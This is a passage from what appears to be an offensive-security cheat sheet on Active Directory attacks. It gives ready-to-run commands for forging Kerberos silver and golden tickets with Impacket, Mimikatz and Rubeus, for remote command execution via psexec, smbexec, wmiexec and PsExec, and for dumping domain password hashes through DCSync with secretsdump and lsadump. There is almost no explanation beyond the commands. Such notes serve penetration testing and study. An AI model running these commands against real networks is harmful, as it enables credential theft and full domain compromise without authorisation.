export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
- **Attacking with [Mimikatz](https://github.com/gentilkiwi/mimikatz)_**
```bash
# To generate the TGS with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

# Inject TGS with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```
Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):

```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```
### 7.5 Golden Ticket
- Attacking With [Impacket](https://github.com/SecureAuthCorp/impacket):
```shell
# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>

# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
- Attacking With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```shell
# To generate the TGT with NTLM
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>

# To generate the TGT with AES 128 key
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

# To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

# Inject TGT with Mimikatz
mimikatz # kerberos::ptt <ticket_kirbi_file>
```
- Inject ticket with [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```
- Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```

### 7.5 DC Sync
- Attacking With [Impacket](https://github.com/SecureAuthCorp/impacket):
```bash
#Impacket To dump AD users Password hash
impacket-secretsdump -just-dc <domain.com>/<username>:<password>@<IP>
impacket-secretsdump <domain.com>/<username>:<password>@<IP>
impacket-secretsdump <username>:<password>@<IP>
```
- Attacking With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
```bash
#mimikatz
lsadump::dcsync
lsadump::dcsync /domain:<domain.com>
lsadump::dcsync /domain:<domain.com> /user:Administrator
```
